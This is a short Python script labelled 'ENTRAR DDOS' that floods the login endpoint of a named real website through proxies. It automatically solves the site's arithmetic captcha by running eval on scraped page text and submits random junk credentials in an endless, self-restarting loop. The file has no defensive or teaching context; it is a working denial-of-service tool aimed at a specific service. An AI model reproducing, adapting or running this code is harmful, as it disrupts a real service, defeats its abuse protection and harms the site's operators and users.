import requests
import random
import json
from bs4 import BeautifulSoup as BS
from colorama import Fore
import threading
from proxies import proxy
import os
import asyncio
import dotenv
import details_generator as DG
import sys

dotenv.load_dotenv()

print(
    """
ミ★ ENTRAR DDOS ★彡
"""
)


ip = "104.26.5.11"


def captcha_solve():
    url = requests.get("https://entrar.in/login/login", proxies=proxy, timeout=5)
    soup = BS(url.content, features="html.parser")
    soup = soup.find("div", {"class": "col-lg-3 col-sm-3"})
    captcha = soup.text.replace(" =", "")
    captcha = eval(captcha)
    return captcha


def send_req():
    limit = 20
    r = requests.Session()
    url = "https://entrar.in/login/auth"
    user = DG.rand_zalgo_user(limit)
    password = DG.rand_zalgo_pass(limit)
    captcha = captcha_solve()
    payload = {"username": user, "password": password, "captcha": str(captcha)}
    req1 = r.post(url, data=payload, proxies=proxy, timeout=5)
    print(Fore.LIGHTGREEN_EX, "Request Sent to ------->", req1.url, "-", req1.elapsed.total_seconds(), "ms")


threads = []


def run():
    t = threading.Thread(target=send_req())
    t.start()


if __name__ == "__main__":
    while True:
        try:
            run()
        except:
            os.execv(sys.argv[0], sys.argv)
